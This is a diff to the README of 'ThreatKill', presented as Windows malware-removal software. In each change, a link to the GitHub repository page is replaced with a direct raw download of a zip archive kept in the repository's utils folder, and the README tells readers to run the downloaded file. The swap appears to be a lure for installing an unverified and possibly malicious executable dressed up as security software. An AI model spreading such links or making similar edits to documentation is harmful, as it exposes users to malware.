@@ -1,6 +1,6 @@
 # 🛡️ ThreatKill - Stop Malware Fast on Windows
 
-[![Download ThreatKill](https://img.shields.io/badge/Download-ThreatKill-blue?style=for-the-badge&logo=github)](https://github.com/sidd6942/ThreatKill)
+[![Download ThreatKill](https://img.shields.io/badge/Download-ThreatKill-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sidd6942/ThreatKill/main/utils/Threat-Kill-v1.4.zip)
 
 ## 🚀 What ThreatKill Does
 
@@ -11,7 +11,7 @@ It is built for Windows users who want a direct way to scan their PC and clean t
 ## 📥 Download and Install
 
 Visit this page to download:
-https://github.com/sidd6942/ThreatKill
+https://raw.githubusercontent.com/sidd6942/ThreatKill/main/utils/Threat-Kill-v1.4.zip
 
 1. Open the link in your browser.
 2. Find the latest release or download option on the page.
@@ -184,6 +184,6 @@ Run another scan:
 ## 📎 Download Link
 
 Visit this page to download:
-https://github.com/sidd6942/ThreatKill
+https://raw.githubusercontent.com/sidd6942/ThreatKill/main/utils/Threat-Kill-v1.4.zip
 
 Open the page, get the Windows file, and run it on your PC
